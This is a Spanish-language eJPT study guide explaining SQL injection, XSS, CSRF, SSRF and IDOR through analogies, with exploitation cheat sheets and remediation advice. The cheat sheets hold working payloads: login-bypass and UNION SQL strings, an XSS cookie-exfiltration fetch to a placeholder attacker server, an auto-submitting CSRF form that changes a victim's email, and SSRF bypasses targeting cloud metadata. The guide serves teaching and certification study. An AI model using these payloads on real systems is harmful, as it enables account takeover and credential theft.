<div align="center">

# 🛡️ WEB APPLICATION VULNERABILITIES
### *Manual Didáctico y Guía de Referencia Práctica – Certificación eJPT*

<img src="images/ejptv2-logo.png" alt="eJPTv2" width="150">
![OWASP](https://img.shields.io/badge/OWASP-Top_Web_Vulnerabilities-blue?style=for-the-badge)
![Reference](https://img.shields.io/badge/Uso-Examen_|_Trabajo_|_Clase-success?style=for-the-badge)

</div>

---

Esta guía está diseñada como un manual dual para entender, explicar y explotar las cinco vulnerabilidades web más comunes del modelo OWASP. Su redacción en texto fluido facilita la lectura continua, la explicación en clases y la inclusión de capturas de pantalla o diagramas ilustrativos entre secciones.

Para consultas inmediatas durante auditorías o exámenes prácticos, la siguiente matriz resume los vectores principales, payloads de prueba e indicadores de éxito.

---

## 🚀 Matriz de Resumen Rápido (Consulta Express)

| Vulnerabilidad | Dónde buscar (Vector) | Payload / Prueba Rápida | Indicador de Éxito |
| :--- | :--- | :--- | :--- |
| **SQLi** | Parámetros URL (`?id=1`), formularios de login, campos de búsqueda. | `'` &#124; `"`, `' OR 1=1;--`, `UNION SELECT 1,2,3--` | Errores de sintaxis SQL, bypass de login o datos extraídos en pantalla. |
| **XSS** | Campos de texto, comentarios, parámetros reflejados en el HTML. | `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>` | Ejecución no autorizada de código JavaScript en el navegador. |
| **CSRF** | Formularios de cambio de contraseña, email o perfil sin token anti-CSRF. | Formulario HTML oculto con envío automático mediante JS. | Acción ejecutada en el servidor sin el consentimiento del usuario. |
| **SSRF** | Funciones que reciben URLs o cargan archivos externos (`?url=`, `?file=`). | `http://127.0.0.1`, `http://169.254.169.254` (Metadata Cloud) | Acceso a servicios internos o información confidencial del servidor. |
| **IDOR** | Parámetros de identificación (`?user_id=105`), rutas REST (`/api/users/105`). | Cambiar ID (`105` $\rightarrow$ `106`), decodificar Base64, probar Cuenta B. | Acceso o modificación no autorizada de datos pertenecientes a otro usuario. |

---

## 1. SQL Injection (SQLi) – Inyección SQL

### 🎓 Concepto y Causa Raíz
Para explicar la inyección SQL a alguien sin experiencia previa, se puede utilizar la analogía del banco. Imagina que vas a la ventanilla de una entidad bancaria y entregas una planilla donde te piden escribir tu nombre. En lugar de escribir simplemente *"Juan"*, escribes *"Juan y regálale 1.000€ a quien lea esto"*. Si el cajero lee la orden completa y la ejecuta al pie de la letra sin verificar la legitimidad de la instrucción, se ha producido una inyección.

En el entorno web, la vulnerabilidad ocurre cuando una aplicación recibe datos introducidos por el usuario y los concatena directamente dentro de una instrucción SQL destinada a la base de datos sin sanearlos ni validarlos previamente. La causa raíz del problema radica en la falta de separación entre el código de la consulta y los datos proporcionados por el usuario, lo que permite a un atacante alterar la lógica de la consulta original e interactuar con el motor de base de datos sin autorización.

### 🔍 Variantes de la Vulnerabilidad
Las inyecciones SQL se clasifican según la forma en que el atacante recibe la información extraída de la base de datos.

En la categoría **In-Band (En banda)**, la respuesta o los datos extraídos se observan directamente en la misma página web. Dentro de esta modalidad destacan las inyecciones basadas en errores, donde el servidor devuelve mensajes técnicos de la base de datos que revelan la estructura interna o nombres de tablas, y las inyecciones basadas en el operador UNION, que permiten combinar la consulta legítima con una segunda instrucción SELECT para extraer datos arbitrarios.

En la categoría **Blind (Ciega)**, la aplicación no muestra datos ni errores explícitos en pantalla, por lo que el atacante debe deducir la información analizando respuestas indirectas. Esto incluye el bypass de autenticación para saltar controles de login forzando condiciones siempre verdaderas, las consultas basadas en respuestas booleanas midiendo cambios sutiles en la interfaz, y las consultas basadas en tiempo inyectando funciones como `SLEEP()` para medir el retraso de respuesta del servidor.

Finalmente, las inyecciones **Out-of-Band (Fuera de banda)** ocurren cuando se fuerza al servidor de base de datos a realizar solicitudes externas HTTP o búsquedas DNS hacia un servidor controlado por el atacante, empleando funciones nativas como `LOAD_FILE()` en MySQL o `xp_dirtree` en MSSQL.

### ⚡ Cheat Sheet de Explotación Rápida
* **Detección:** Inyectar comillas simples `'`, comillas dobles `"`, o comentarios `;--` en campos de entrada.
* **Bypass de Autenticación:**
  ```sql
  ' OR 1=1;--
  admin'--
  " OR "1"="1
  ```
* **Metodología de Explotación UNION SQLi:**
  1. Identificar el número de columnas de la consulta original: `UNION SELECT 1,2,3--` (incrementar hasta eliminar el error).
  2. Determinar qué columna refleja datos en la interfaz: `0 UNION SELECT 1,2,3--` (usar un ID inexistente como `0`).
  3. Extraer el nombre de la base de datos actual: `0 UNION SELECT 1,database(),3--`.
  4. Enumerar tablas y columnas consultando las vistas del sistema `information_schema.tables` e `information_schema.columns`.

### 🛡️ Prevención y Remedición
La defensa definitiva contra SQLi es el uso de **Consultas Preparadas o Sentencias Parametrizadas**. Este mecanismo obliga al motor de base de datos a tratar la entrada del usuario estrictamente como un valor de datos y nunca como código ejecutable, imposibilitando la alteración de la estructura de la consulta. Se debe complementar con validación estricta de entradas y el principio de mínimo privilegio en las cuentas de la base de datos.

---

## 2. Cross-Site Scripting (XSS) – Script en Sitios Cruzados

### 🎓 Concepto y Causa Raíz
Una forma muy clara de enseñar el concepto de XSS es mediante la analogía del tablón de anuncios. Imagina que dejas una nota en un tablón de anuncios público. En lugar de escribir texto normal, utilizas una "tinta mágica". Cuando cualquier otra persona se acerca a leer la nota, la tinta mágica se activa al contacto visual y le obliga a entregar sus llaves al atacante sin darse cuenta.

Técnicamente, el XSS se produce cuando una aplicación web recibe datos suministrados por un usuario y los incluye en la página web devuelta al navegador sin filtrarlos ni codificarlos adecuadamente. La causa raíz es que el navegador web del cliente no puede distinguir si un fragmento de código HTML o JavaScript proviene del desarrollador legítimo o de una entrada maliciosa, ejecutándolo de manera transparente en el contexto de sesión de la víctima.

### 🔍 Variantes de la Vulnerabilidad
El impacto y la persistencia de un ataque XSS dependen de la ubicación donde se procesa y almacena el código inyectado.

El **XSS Reflejado (Reflected)** ocurre cuando el script malicioso se envía dentro de la propia solicitud HTTP (como un parámetro en la URL) y el servidor lo "refleja" de inmediato en la respuesta HTML. Para explotarlo, el atacante debe engañar a la víctima para que haga clic en un enlace preparado.

El **XSS Almacenado (Stored o Persistente)** es la variante más peligrosa, ya que el payload malicioso se guarda de forma permanente en la base de datos del servidor, como en la sección de comentarios de un blog o el perfil de un usuario. Cada vez que cualquier usuario visita esa sección, el código se ejecuta automáticamente en su navegador.

El **XSS basado en DOM (DOM-Based)** se ejecuta íntegramente en el lado del cliente. Ocurre cuando el código JavaScript legítimo de la página lee datos de una fuente no segura en el navegador (como `location.hash` o la URL) y los escribe de manera insegura en el documento HTML utilizando sinks como `innerHTML` o `document.write`.

Por último, el **XSS Ciego (Blind XSS)** es una forma de XSS almacenado donde el payload se guarda en la base de datos pero se ejecuta en un panel administrativo de acceso restringido al que el atacante no tiene acceso directo.

### ⚡ Cheat Sheet de Explotación Rápida
* **Prueba de Concepto (PoC) Básica:** `<script>alert('XSS')</script>`
* **Escapar de un Atributo HTML (`<input value="...">`):** `"> <script>alert('XSS')</script>`
* **Escapar de un Bloque `<textarea>`:** `</textarea><script>alert('XSS')</script>`
* **Inyección dentro de código JavaScript:** `';alert('XSS');//`
* **Bypass de Filtros mediante Eventos HTML:**
  ```html
  <img src="x" onerror="alert(1)">
  <svg onload="alert(1)">
  ```
* **Payload para Extracción de Cookies de Sesión:**
  ```javascript
  fetch('http://SERVIDOR-ATACANTE/?cookie=' + btoa(document.cookie))
  ```

### 🛡️ Prevención y Remedición
Para mitigar XSS se debe aplicar **Escapado o Codificación de Salida (Output Encoding)** antes de renderizar cualquier dato en el navegador, convirtiendo caracteres especiales en sus entidades HTML correspondientes (por ejemplo, transformar `<` en `&lt;`). Adicionalmente, se debe configurar el atributo `HttpOnly` en las cookies de sesión para impedir que el código JavaScript pueda leerlas mediante `document.cookie`.

---

## 3. Cross-Site Request Forgery (CSRF) – Falsificación de Solicitudes

### 🎓 Concepto y Causa Raíz
Para explicar CSRF se puede usar la analogía del trámite presencial. Estás dentro de una oficina bancaria realizando un trámite legítimo y con tu sesión abierta. De repente, una persona desde la calle te entrega un folleto publicitario. Al abrir el folleto, sin darte cuenta, le entregas al cajero una orden de transferencia firmada por ti para enviar dinero a la cuenta del atacante.

En el contexto web, CSRF es un ataque que fuerza al navegador de un usuario autenticado a enviar una solicitud HTTP no deseada hacia una aplicación en la que la víctima tiene una sesión activa. La causa raíz del problema es el comportamiento predeterminado de los navegadores web, los cuales adjuntan automáticamente las cookies de sesión asociadas al dominio de destino en cada petición, sin verificar si la solicitud se originó de forma consciente en el sitio legítimo o en una página maliciosa externa.

### 🔍 Requisitos y Dinámica de Explotación
Para que una vulnerabilidad CSRF sea explotable, deben cumplirse tres condiciones esenciales simultáneamente. Primero, la víctima debe contar con una sesión activa y autenticada en la aplicación web de destino. Segundo, la acción ejecutada debe ser relevante y cambiar un estado en el sistema, tal como modificar la contraseña de acceso, actualizar la dirección de correo electrónico o realizar una transacción financiera. Tercero, la aplicación no debe incluir ningún parámetro impredecible que valide el origen real de la petición.

### ⚡ Cheat Sheet de Explotación Rápida
* **PoC con Formulario HTML Oculto (Envío Automático):**
  ```html
  <form action="http://sitio-vulnerable.com/api/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
  ```
Este vector de ataque funciona tanto para solicitudes tramitadas por el método POST como para peticiones GET que modifiquen estado mediante parámetros en la URL.

### 🛡️ Prevención y Remedición
La medida principal de protección contra CSRF es el uso de **Tokens Anti-CSRF**. Estos tokens son valores alfanuméricos aleatorios e impredecibles asociados a la sesión del usuario que deben incluirse en cada formulario o solicitud de cambio de estado y ser validados estrictamente en el servidor. Como segunda capa de defensa, se deben configurar las cookies de sesión con el atributo `SameSite=Strict` o `SameSite=Lax` para restringir su envío automático desde sitios de terceros.

---

## 4. Server-Side Request Forgery (SSRF) – Falsificación de Solicitudes en el Servidor

### 🎓 Concepto y Causa Raíz
La analogía para explicar SSRF se basa en la figura del mensajero interno de una empresa. Le pides al mensajero corporativo que acuda al despacho del director (una zona restringida a la que tú no tienes acceso directo) y te traiga los documentos que están sobre su mesa. Como el mensajero es un empleado interno de confianza, el personal de seguridad lo deja pasar sin realizar comprobaciones adicionales.

Técnicamente, SSRF ocurre cuando una aplicación web recibe una URL o dirección IP proporcionada por el usuario y el servidor backend realiza la petición red directamente desde su propia infraestructura. La causa raíz es la confianza implícita que las redes e infraestructuras internas depositan en las solicitudes que se originan dentro del propio servidor de aplicaciones, permitiendo a un atacante interactuar con servicios locales o sistemas detrás del cortafuegos.

### 🔍 Variantes e Impacto en la Infraestructura
Las consecuencias de un ataque SSRF dependen de si la respuesta de la petición realizada por el servidor es devuelta o no al cliente.

En el **SSRF Regular (Visible)**, el servidor web realiza la petición interna y muestra el contenido resultante directamente en la pantalla del usuario. Esto permite a un atacante leer archivos de servicios internos, explorar paneles de administración no expuestos a internet o consultar APIs privadas.

En el **SSRF Ciego (Blind SSRF)**, el servidor efectúa la petición hacia el destino indicado pero no devuelve el contenido en la respuesta HTTP. Para confirmar la vulnerabilidad, el atacante debe forzar conexiones hacia un servidor externo bajo su control o analizar variaciones en los tiempos de respuesta de la aplicación.

El impacto más crítico de SSRF en entornos Cloud (AWS, Azure, GCP) es la exfiltración de credenciales secretas accediendo a la dirección IP de metadatos del proveedor de nube (`http://169.254.169.254`).

### ⚡ Cheat Sheet de Bypasses Comunes
* **Bypass de Filtros para `127.0.0.1` o `localhost`:**
  * Representación abreviada: `http://127.1` &#124; `http://0` &#124; `http://0.0.0.0`
  * Formato Decimal u Octal: `http://2130706433`
  * Dominios con resolución DNS local: `http://127.0.0.1.nip.io`
  * Notación IPv6: `http://[::1]`
* **Estructura de Credenciales de URL mediante `@`:** `https://sitio-permitido.com@attacker.com/`
* **Inyección de Saltos de Directorio (Path Traversal):** `/../admin`
* **Extracción de Metadatos Cloud (AWS):** `http://169.254.169.254/latest/meta-data/`

### 🛡️ Prevención y Remedición
Para prevenir SSRF se deben implementar **Listas de Permitidos (Allow Lists)** estrictas que restrinjan los dominios, direcciones IP y esquemas de red (como `http` y `https`) a los que el servidor tiene permitido conectarse. Además, se deben deshabilitar las redirecciones HTTP automáticas en las librerías del backend y parsear adecuadamente las URLs recibidas.

---

## 5. Insecure Direct Object Reference (IDOR) – Referencias Directas Inseguras a Objetos

### 🎓 Concepto y Causa Raíz
Para explicar IDOR de forma muy sencilla se utiliza la analogía de la llave del hotel. Llegas a un hotel y en recepción te entregan la llave de la habitación número 105. Al caminar por el pasillo, te diriges a la habitación 106 e introduces tu llave o cambias el número en el pomo de la puerta. La puerta se abre de par en par, permitiéndote ver y manipular el equipaje de otro huésped.

En el ámbito del desarrollo web, IDOR es un fallo de control de acceso que surge cuando una aplicación utiliza un identificador directo (como un número entero en la URL o un parámetro en una solicitud) para recuperar un objeto o recurso de la base de datos sin verificar si el usuario autenticado posee los permisos necesarios para acceder a él. La causa raíz radica en confundir la **Autenticación** (validar quién es el usuario) con la **Autorización** (verificar si ese usuario específico tiene derecho a consultar o modificar el objeto solicitado).

### 🔍 Tipos de Identificadores y Estrategias
Los desarrolladores suelen intentar mitigar o Biswas ocultar los recursos mediante diferentes tipos de identificadores.

Los **Identificadores Secuenciales** son los más sencillos de explotar, ya que basta con incrementar o decrementar números enteros (`?user_id=105` a `106`). 

Los **Identificadores Codificados** emplean formatos como Base64. Para explotarlos solo se requiere decodificar la cadena, modificar el valor interno y recodificar la solicitud antes de enviarla.

Los **Identificadores Hasheados** aplican algoritmos como MD5 sobre un número entero predecible. Si el identificador es `md5(100)`, el atacante puede generar el hash de `101` e inyectarlo en el parámetro.

Los **Identificadores Impredecibles (UUIDs)** no pueden adivinarse fácilmente por fuerza bruta. Para probar IDOR en estos escenarios se utiliza la **Técnica de las Dos Cuentas**: se obtiene el UUID de un recurso privado creado con la Cuenta A y se intenta consultar dicho UUID estando autenticado con la Cuenta B.

### ⚡ Dónde Buscar IDOR durante un Examen o Auditoría
* Parámetros numéricos en la URL o en segmentos de rutas de APIs REST (`/api/v1/users/123/documents`).
* Cuerpo de solicitudes POST, PUT o llamadas JSON (`{"account_id": 450}`).
* Encabezados HTTP personalizados, cookies de sesión o parámetros no expuestos en la interfaz (Parameter Mining).

### 🛡️ Prevención y Remedición
La única solución efectiva contra IDOR es implementar **Verificaciones de Autorización a Nivel de Objeto** en el servidor para cada solicitud entrante. El backend debe comprobar explícitamente si el identificador de sesión del usuario actual es el propietario legítimo del recurso solicitado antes de devolver cualquier información. Esto se suele estructurar mediante modelos de Control de Acceso Basado en Roles (RBAC).
